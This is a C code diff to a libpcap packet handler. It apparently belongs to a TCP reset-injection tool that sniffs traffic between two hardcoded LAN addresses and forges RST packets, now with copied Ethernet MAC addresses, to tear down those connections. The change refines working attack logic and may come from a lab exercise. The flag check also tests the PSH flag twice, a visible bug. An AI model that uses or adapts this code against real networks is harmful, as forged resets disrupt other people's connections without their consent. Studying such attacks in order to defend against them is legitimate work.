@@ -6,9 +6,10 @@ void processPacket(u_char *args, const struct pcap_pkthdr *header, const u_char 
 	struct spoofedcontent spoofedContent;
 	struct in_addr sourceIP, destinationIP;
 	int size = header->len;
+	struct ethernetheader *ethernetHeader = (struct ethernetheader *) (buffer);
 	struct ipheader *ipHeader = (struct ipheader*)(buffer + sizeof(struct ethernetheader));
 	struct tcpheader *tcpHeader = (struct tcpheader*)(buffer + sizeof(struct ipheader) + sizeof(struct ethernetheader));
-	if(ipHeader->protocol == 6)
+	if(ipHeader->protocol == 6 && ipHeader->sourceIPAddress == inet_addr("192.168.0.111") && ipHeader->destinationIPAddress == inet_addr("192.168.0.101"))
 	{
 		if(tcpHeader->flag_ACK && !(tcpHeader->flag_PSH  || tcpHeader->flag_PSH || tcpHeader->flag_FIN))
 		{
@@ -29,11 +30,8 @@ void processPacket(u_char *args, const struct pcap_pkthdr *header, const u_char 
 			spoofedContent.destinationPort = tcpHeader->destinationPort;
 			spoofedContent.sequenceNumber = tcpHeader->sequenceNumber;
 			spoofedContent.ackNumber = tcpHeader->ackNumber;
-			
-			//test
-			struct ethernetheader *e = (struct ethernetheader *) (buffer);
-			memcpy(spoofedContent.temps, e->sourceInterface, ETH_ALEN);
-			memcpy(spoofedContent.tempd, e->destinationInterface, ETH_ALEN);
+			memcpy(spoofedContent.sourceInterface, ethernetHeader->sourceInterface, ETH_ALEN);
+			memcpy(spoofedContent.destinationInterface, ethernetHeader->destinationInterface, ETH_ALEN);
 
             sendResetPacket(spoofedContent);
 
@@ -44,10 +42,8 @@ void processPacket(u_char *args, const struct pcap_pkthdr *header, const u_char 
 			spoofedContent.destinationPort = tcpHeader->sourcePort;
 			spoofedContent.sequenceNumber = tcpHeader->ackNumber;
 			spoofedContent.ackNumber = tcpHeader->sequenceNumber;
-
-			//test
-			memcpy(spoofedContent.temps, e->destinationInterface, ETH_ALEN);
-			memcpy(spoofedContent.tempd, e->sourceInterface, ETH_ALEN);
+			memcpy(spoofedContent.sourceInterface, ethernetHeader->destinationInterface, ETH_ALEN);
+			memcpy(spoofedContent.destinationInterface, ethernetHeader->sourceInterface, ETH_ALEN);
 
 			sendResetPacket(spoofedContent);
 		}
